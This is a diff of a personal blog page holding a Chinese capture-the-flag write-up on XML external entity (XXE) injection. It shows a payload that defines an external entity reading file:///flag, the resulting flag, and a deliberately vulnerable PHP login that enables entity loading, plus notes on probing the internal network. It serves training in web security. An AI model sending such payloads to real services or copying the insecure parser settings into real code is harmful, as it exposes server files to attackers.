@@ -73,7 +73,7 @@
     <div class="focusinfo no-select">
       <div class="header-tou">
         <a href="https://s1rius.github.io">
-          <img src="https://cdn.jsdelivr.net/gh/cns1rius/cdn@1.0/img/custom/avatar.jpg">
+          <img src="https://cdn.jsdelivr.net/gh/cns1rius/cdn@1.0https://cdn.jsdelivr.net/gh/cns1rius/cdn@1.0/img/custom/avatar.jpg">
         </a>
       </div>
       <div class="header-info">
@@ -220,16 +220,6 @@
               </li>
             
               <li>
-                <a href="/comment/">
-                  <span class="faa-parent animated-hover">
-                    <i class="fa  fa-pencil-square-o faa-tada" aria-hidden="true"></i>
-                    留言板
-                  </span>
-                </a>
-                
-              </li>
-            
-              <li>
                 <a href="/links/">
                   <span class="faa-parent animated-hover">
                     <i class="fa  fa-link faa-shake" aria-hidden="true"></i>
@@ -250,23 +240,12 @@
               </li>
             
               <li>
-                <a href="/">
+                <a href="/about/">
                   <span class="faa-parent animated-hover">
                     <i class="fa  fa-leaf faa-wrench" aria-hidden="true"></i>
                     关于
                   </span>
                 </a>
-                
-                  <ul class="sub-menu">
-                    
-                      <li>
-                        <a href="/about/">
-                          <i class="fa fa-meetup" aria-hidden="true"></i>
-                          我
-                        </a>
-                      </li>
-                    
-                  </ul>
                 
               </li>
             
@@ -314,12 +293,77 @@
         
         <div class="entry-content">
           <h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><p>发现输入的username被alert了<br>查源码    </p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">onclick=<span class="string">"XMLFunction()"</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/5db2cfc89d444078a9eb3b1c0d013582.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">抓包看xml格式<br><img src="https://img-blog.csdnimg.cn/f0d808b8650248d5829499816debc6de.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">回来看控制台<br>发现js的xml应用<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">XMLFunction</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">var</span> xml = <span class="string">''</span> +</span><br><span class="line">                <span class="string">'&lt;?xml version="1.0" encoding="UTF-8"?&gt;'</span> +</span><br><span class="line">            <span class="string">'&lt;root&gt;'</span> +</span><br><span class="line">            <span class="string">' &lt;username&gt;'</span> + $(<span class="string">'#username'</span>).val() + <span class="string">'&lt;/username&gt;'</span> +</span><br><span class="line">            <span class="string">' &lt;password&gt;'</span> + $(<span class="string">'#password'</span>).val() + <span class="string">'&lt;/password&gt;'</span> +</span><br><span class="line">            <span class="string">' &lt;/root&gt;'</span>;</span><br><span class="line">            <span class="keyword">var</span> xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">            xmlhttp.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(xmlhttp.readyState == <span class="number">4</span>)&#123;</span><br><span class="line">                    <span class="built_in">console</span>.log(xmlhttp.readyState);</span><br><span class="line">                    <span class="built_in">console</span>.log(xmlhttp.responseText);</span><br><span class="line">                    alert(xmlhttp.responseText);</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            xmlhttp.open(<span class="string">"POST"</span>,<span class="string">"login.php"</span>,<span class="literal">true</span>);</span><br><span class="line">            xmlhttp.send(xml);</span><br><span class="line">        &#125;;</span><br><span class="line">    &lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>构造xxe攻击<br><img src="https://img-blog.csdnimg.cn/47c06ac5625149b68b8b8f6a5c7ed1b1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">这是post包==传的时候记得把注释删去==<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">flag</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///flag"</span>&gt;</span>&lt;!--构造实体--&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;flag;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="comment">&lt;!--输出flag实体--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">password</span>&gt;</span>2333<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<pre><code class="js">onclick=&quot;XMLFunction()&quot;
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/5db2cfc89d444078a9eb3b1c0d013582.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">抓包看xml格式<br><img src="https://img-blog.csdnimg.cn/f0d808b8650248d5829499816debc6de.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">回来看控制台<br>发现js的xml应用</p>
+<pre><code class="js">&lt;script type=&quot;text/javascript&quot;&gt;
+        function XMLFunction(){
+            var xml = &#39;&#39; +
+                &#39;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&#39; +
+            &#39;&lt;root&gt;&#39; +
+            &#39; &lt;username&gt;&#39; + $(&#39;#username&#39;).val() + &#39;&lt;/username&gt;&#39; +
+            &#39; &lt;password&gt;&#39; + $(&#39;#password&#39;).val() + &#39;&lt;/password&gt;&#39; +
+            &#39; &lt;/root&gt;&#39;;
+            var xmlhttp = new XMLHttpRequest();
+            xmlhttp.onreadystatechange = function () {
+                if(xmlhttp.readyState == 4){
+                    console.log(xmlhttp.readyState);
+                    console.log(xmlhttp.responseText);
+                    alert(xmlhttp.responseText);
+
+                }
+            }
+            xmlhttp.open(&quot;POST&quot;,&quot;login.php&quot;,true);
+            xmlhttp.send(xml);
+        };
+    &lt;/script&gt;
+</code></pre>
+<p>构造xxe攻击<br><img src="https://img-blog.csdnimg.cn/47c06ac5625149b68b8b8f6a5c7ed1b1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">这是post包==传的时候记得把注释删去==</p>
+<pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE root[
+&lt;!ENTITY flag SYSTEM &quot;file:///flag&quot;&gt;&lt;!--构造实体--&gt;
+]&gt;
+&lt;root&gt;
+&lt;username&gt;&amp;flag;&lt;/username&gt;&lt;!--输出flag实体--&gt;
+&lt;password&gt;2333&lt;/password&gt;
+&lt;/root&gt;
+</code></pre>
 <p>flag{6866a844-3788-4a9d-9909-1d9d9943f56f}</p>
 <p><img src="https://img-blog.csdnimg.cn/cd6a7f863a0647bb892ae50de7f3e0f9.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/13c964cfa670469aa893c588d287e821.png" alt="在这里插入图片描述"></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* autor: c0ny1</span></span><br><span class="line"><span class="comment">* date: 2018-2-7</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">$USERNAME = <span class="string">'admin'</span>; <span class="comment">//账号</span></span><br><span class="line">$PASSWORD = <span class="string">'024b87931a03f738fff6693ce0a78c88'</span>; <span class="comment">//密码</span></span><br><span class="line">$result = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">libxml_disable_entity_loader(<span class="keyword">false</span>);</span><br><span class="line">$xmlfile = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">	$dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">	$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">	$creds = simplexml_import_dom($dom);</span><br><span class="line"></span><br><span class="line">	$username = $creds-&gt;username;</span><br><span class="line">	$password = $creds-&gt;password;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>($username == $USERNAME &amp;&amp; $password == $PASSWORD)&#123;</span><br><span class="line">		$result = sprintf(<span class="string">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;"</span>,<span class="number">1</span>,$username);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		$result = sprintf(<span class="string">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;"</span>,<span class="number">0</span>,$username);</span><br><span class="line">	&#125;	</span><br><span class="line">&#125;<span class="keyword">catch</span>(<span class="keyword">Exception</span> $e)&#123;</span><br><span class="line">	$result = sprintf(<span class="string">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;"</span>,<span class="number">3</span>,$e-&gt;getMessage());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header(<span class="string">'Content-Type: text/html; charset=utf-8'</span>);</span><br><span class="line"><span class="keyword">echo</span> $result;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+/**
+* autor: c0ny1
+* date: 2018-2-7
+*/
+
+$USERNAME = &#39;admin&#39;; //账号
+$PASSWORD = &#39;024b87931a03f738fff6693ce0a78c88&#39;; //密码
+$result = null;
+
+libxml_disable_entity_loader(false);
+$xmlfile = file_get_contents(&#39;php://input&#39;);
+
+try{
+    $dom = new DOMDocument();
+    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
+    $creds = simplexml_import_dom($dom);
+
+    $username = $creds-&gt;username;
+    $password = $creds-&gt;password;
+
+    if($username == $USERNAME &amp;&amp; $password == $PASSWORD){
+        $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,1,$username);
+    }else{
+        $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,$username);
+    }    
+}catch(Exception $e){
+    $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,3,$e-&gt;getMessage());
+}
+
+header(&#39;Content-Type: text/html; charset=utf-8&#39;);
+echo $result;
+?&gt;
+</code></pre>
 <p>有admin密码了也没用<br>藏内网了，上次比赛ssrf题出过</p>
 <ul>
 <li>etc/hosts </li>
@@ -558,7 +602,7 @@ $(document).ready(function() {
   </section>
   <div id="mo-nav" class="">
   <div class="m-avatar">
-    <img src="https://cdn.jsdelivr.net/gh/cns1rius/cdn@1.0/img/custom/avatar.jpg">
+    <img src="https://cdn.jsdelivr.net/gh/cns1rius/cdn@1.0https://cdn.jsdelivr.net/gh/cns1rius/cdn@1.0/img/custom/avatar.jpg">
   </div>
   <p style="text-align: center; color: #333; font-weight: 900; font-family: 'Ubuntu', sans-serif; letter-spacing: 1.5px">s1rius's blog</p>
   <p style="text-align: center; word-spacing: 20px;">
@@ -618,16 +662,6 @@ $(document).ready(function() {
       </li>
     
       <li>
-        <a href="/comment/">
-          <span class="faa-parent animated-hover">
-            <i class="fa  fa-pencil-square-o faa-tada" aria-hidden="true"></i>
-            留言板
-          </span>
-        </a>
-        
-      </li>
-    
-      <li>
         <a href="/links/">
           <span class="faa-parent animated-hover">
             <i class="fa  fa-link faa-shake" aria-hidden="true"></i>
@@ -648,23 +682,12 @@ $(document).ready(function() {
       </li>
     
       <li>
-        <a href="/">
+        <a href="/about/">
           <span class="faa-parent animated-hover">
             <i class="fa  fa-leaf faa-wrench" aria-hidden="true"></i>
             关于
           </span>
         </a>
-        
-          <ul class="sub-menu">
-            
-              <li>
-                <a href="/about/">
-                  <i class="fa fa-meetup" aria-hidden="true"></i>
-                  我
-                </a>
-              </li>
-            
-          </ul>
         
       </li>
     
@@ -720,7 +743,7 @@ $(document).ready(function() {
 
     preload="auto"
 
-    volume="0.7"
+    volume="0.3"
 
     mutex="true"
 
